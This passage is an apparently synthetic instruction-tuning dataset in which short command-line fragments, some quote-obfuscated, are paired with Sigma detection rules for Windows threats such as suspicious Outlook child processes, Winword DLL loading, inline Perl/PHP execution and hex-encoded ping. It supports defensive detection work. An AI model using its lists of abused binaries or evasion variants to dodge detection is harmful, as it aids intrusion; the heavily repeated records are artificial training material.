ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\OUTLOOK.EXE \\AppVLP.exe \\bash.exe \\cmd.exe \\cscript.exe \\forfiles.exe \\hh.exe \\mftrace.exe \\msbuild.exe \\msdt.exe \\mshta.exe \\msiexec.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\schtasks.exe \\scrcons.exe \\scriptrunner.exe \\sh.exe \\svchost.exe \\wmic.exe \\wscript.exe", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\outlook.exe", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\outlook.exe\"", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\outlook", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\outlook.exe", "output": "title: Suspicious Outlook Child Process\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nrelated:\n    - id: 438025f9-5856-4663-83f7-52f878a70a50 # Office Child Processes\n      type: derived\n    - id: e212d415-0e93-435f-9e1a-f29005bb4723 # Outlook Remote Child Process\n      type: derived\nstatus: test\ndescription: Detects a suspicious process spawning from an Outlook process.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye Team\ndate: 2022-02-28\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.t1204.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            # - '\\rundll32.exe'\n            # filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains: '\\PhotoViewer.dll'\n            # filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #   ParentImage|endswith: '\\OUTLOOK.EXE'\n            #   Image|endswith: '\\rundll32.exe'\n            #   CommandLine|contains|all:\n            #     - 'shell32.dll,Control_RunDLL'\n            #     - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WINWORD.exe WinWord.exe /l .dll", "output": "title: Potential Arbitrary DLL Load Using Winword\nid: f7375e28-5c14-432f-b8d1-1db26c832df3\nrelated:\n    - id: 2621b3a6-3840-4810-ac14-a02426086171\n      type: obsolete\nstatus: test\ndescription: Detects potential DLL sideloading using the Microsoft Office winword process via the '/l' flag.\nreferences:\n    - https://github.com/D4Vinci/One-Lin3r/blob/9fdfa5f0b9c698dfbd4cdfe7d2473192777ae1c6/one_lin3r/core/liners/windows/cmd/dll_loader_word.py\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-03-29\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WINWORD.exe'\n        - OriginalFileName: 'WinWord.exe'\n    selection_dll:\n        CommandLine|contains|all:\n            - '/l '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WINWORD.exe WinWord.exe /l \".\"\"d\"\"l\"\"l\"", "output": "title: Potential Arbitrary DLL Load Using Winword\nid: f7375e28-5c14-432f-b8d1-1db26c832df3\nrelated:\n    - id: 2621b3a6-3840-4810-ac14-a02426086171\n      type: obsolete\nstatus: test\ndescription: Detects potential DLL sideloading using the Microsoft Office winword process via the '/l' flag.\nreferences:\n    - https://github.com/D4Vinci/One-Lin3r/blob/9fdfa5f0b9c698dfbd4cdfe7d2473192777ae1c6/one_lin3r/core/liners/windows/cmd/dll_loader_word.py\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-03-29\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WINWORD.exe'\n        - OriginalFileName: 'WinWord.exe'\n    selection_dll:\n        CommandLine|contains|all:\n            - '/l '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WINWORD WinWord /l .dll", "output": "title: Potential Arbitrary DLL Load Using Winword\nid: f7375e28-5c14-432f-b8d1-1db26c832df3\nrelated:\n    - id: 2621b3a6-3840-4810-ac14-a02426086171\n      type: obsolete\nstatus: test\ndescription: Detects potential DLL sideloading using the Microsoft Office winword process via the '/l' flag.\nreferences:\n    - https://github.com/D4Vinci/One-Lin3r/blob/9fdfa5f0b9c698dfbd4cdfe7d2473192777ae1c6/one_lin3r/core/liners/windows/cmd/dll_loader_word.py\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-03-29\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WINWORD.exe'\n        - OriginalFileName: 'WinWord.exe'\n    selection_dll:\n        CommandLine|contains|all:\n            - '/l '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WINWORD.exe WinWord.exe /l .dll", "output": "title: Potential Arbitrary DLL Load Using Winword\nid: f7375e28-5c14-432f-b8d1-1db26c832df3\nrelated:\n    - id: 2621b3a6-3840-4810-ac14-a02426086171\n      type: obsolete\nstatus: test\ndescription: Detects potential DLL sideloading using the Microsoft Office winword process via the '/l' flag.\nreferences:\n    - https://github.com/D4Vinci/One-Lin3r/blob/9fdfa5f0b9c698dfbd4cdfe7d2473192777ae1c6/one_lin3r/core/liners/windows/cmd/dll_loader_word.py\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-03-29\ntags:\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\WINWORD.exe'\n        - OriginalFileName: 'WinWord.exe'\n    selection_dll:\n        CommandLine|contains|all:\n            - '/l '\n            - '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\perl.exe perl.exe -e", "output": "title: Perl Inline Command Execution\nid: f426547a-e0f7-441a-b63e-854ac5bdf54d\nstatus: test\ndescription: Detects execution of perl using the \"-e\"/\"-E\" flags. This is could be used as a way to launch a reverse shell or execute live perl code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\perl.exe'\n        - OriginalFileName: 'perl.exe' # Also covers perlX.XX.exe\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\perl.exe\\\" perl.exe -e", "output": "title: Perl Inline Command Execution\nid: f426547a-e0f7-441a-b63e-854ac5bdf54d\nstatus: test\ndescription: Detects execution of perl using the \"-e\"/\"-E\" flags. This is could be used as a way to launch a reverse shell or execute live perl code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\perl.exe'\n        - OriginalFileName: 'perl.exe' # Also covers perlX.XX.exe\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\perl perl -e", "output": "title: Perl Inline Command Execution\nid: f426547a-e0f7-441a-b63e-854ac5bdf54d\nstatus: test\ndescription: Detects execution of perl using the \"-e\"/\"-E\" flags. This is could be used as a way to launch a reverse shell or execute live perl code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\perl.exe'\n        - OriginalFileName: 'perl.exe' # Also covers perlX.XX.exe\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\perl.exe -e perl.exe", "output": "title: Perl Inline Command Execution\nid: f426547a-e0f7-441a-b63e-854ac5bdf54d\nstatus: test\ndescription: Detects execution of perl using the \"-e\"/\"-E\" flags. This is could be used as a way to launch a reverse shell or execute live perl code.\nreferences:\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n    - https://www.revshells.com/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\perl.exe'\n        - OriginalFileName: 'perl.exe' # Also covers perlX.XX.exe\n    selection_cli:\n        CommandLine|contains: ' -e'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\php.exe php.exe -r", "output": "title: Php Inline Command Execution\nid: d81871ef-5738-47ab-9797-7a9c90cd4bfb\nstatus: test\ndescription: Detects execution of php using the \"-r\" flag. This is could be used as a way to launch a reverse shell or execute live php code.\nreferences:\n    - https://www.php.net/manual/en/features.commandline.php\n    - https://www.revshells.com/\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\php.exe'\n        - OriginalFileName: 'php.exe'\n    selection_cli:\n        CommandLine|contains: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\php.exe \\\"p\\\"\\\"h\\\"\\\"p\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" -r", "output": "title: Php Inline Command Execution\nid: d81871ef-5738-47ab-9797-7a9c90cd4bfb\nstatus: test\ndescription: Detects execution of php using the \"-r\" flag. This is could be used as a way to launch a reverse shell or execute live php code.\nreferences:\n    - https://www.php.net/manual/en/features.commandline.php\n    - https://www.revshells.com/\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\php.exe'\n        - OriginalFileName: 'php.exe'\n    selection_cli:\n        CommandLine|contains: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\php php -r", "output": "title: Php Inline Command Execution\nid: d81871ef-5738-47ab-9797-7a9c90cd4bfb\nstatus: test\ndescription: Detects execution of php using the \"-r\" flag. This is could be used as a way to launch a reverse shell or execute live php code.\nreferences:\n    - https://www.php.net/manual/en/features.commandline.php\n    - https://www.revshells.com/\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\php.exe'\n        - OriginalFileName: 'php.exe'\n    selection_cli:\n        CommandLine|contains: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\php.exe php.exe -r", "output": "title: Php Inline Command Execution\nid: d81871ef-5738-47ab-9797-7a9c90cd4bfb\nstatus: test\ndescription: Detects execution of php using the \"-r\" flag. This is could be used as a way to launch a reverse shell or execute live php code.\nreferences:\n    - https://www.php.net/manual/en/features.commandline.php\n    - https://www.revshells.com/\n    - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\php.exe'\n        - OriginalFileName: 'php.exe'\n    selection_cli:\n        CommandLine|contains: ' -r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ping.exe 0x", "output": "title: Ping Hex IP\nid: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd\nstatus: test\ndescription: Detects a ping command that uses a hex encoded IP address\nreferences:\n    - https://github.com/vysecurity/Aggressor-VYSEC/blob/0d61c80387b9432dab64b8b8a9fb52d20cfef80e/ping.cna\n    - https://twitter.com/vysecurity/status/977198418354491392\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-23\nmodified: 2022-01-07\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ping.exe'\n        CommandLine|contains: '0x'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ping.exe \"0x\"", "output": "title: Ping Hex IP\nid: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd\nstatus: test\ndescription: Detects a ping command that uses a hex encoded IP address\nreferences:\n    - https://github.com/vysecurity/Aggressor-VYSEC/blob/0d61c80387b9432dab64b8b8a9fb52d20cfef80e/ping.cna\n    - https://twitter.com/vysecurity/status/977198418354491392\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-23\nmodified: 2022-01-07\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ping.exe'\n        CommandLine|contains: '0x'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ping 0x", "output": "title: Ping Hex IP\nid: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd\nstatus: test\ndescription: Detects a ping command that uses a hex encoded IP address\nreferences:\n    - https://github.com/vysecurity/Aggressor-VYSEC/blob/0d61c80387b9432dab64b8b8a9fb52d20cfef80e/ping.cna\n    - https://twitter.com/vysecurity/status/977198418354491392\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-23\nmodified: 2022-01-07\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ping.exe'\n        CommandLine|contains: '0x'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ping.exe 0x", "output": "title: Ping Hex IP\nid: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd\nstatus: test\ndescription: Detects a ping command that uses a hex encoded IP address\nreferences:\n    - https://github.com/vysecurity/Aggressor-VYSEC/blob/0d61c80387b9432dab64b8b8a9fb52d20cfef80e/ping.cna\n    - https://twitter.com/vysecurity/status/977198418354491392\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-03-23\nmodified: 2022-01-07\ntags:\n    - attack.defense-evasion\n    - attack.t1140\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ping.exe'\n        CommandLine|contains: '0x'\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Unlikely, because no sane admin pings IP addresses in a hexadecimal form\nlevel: high"}
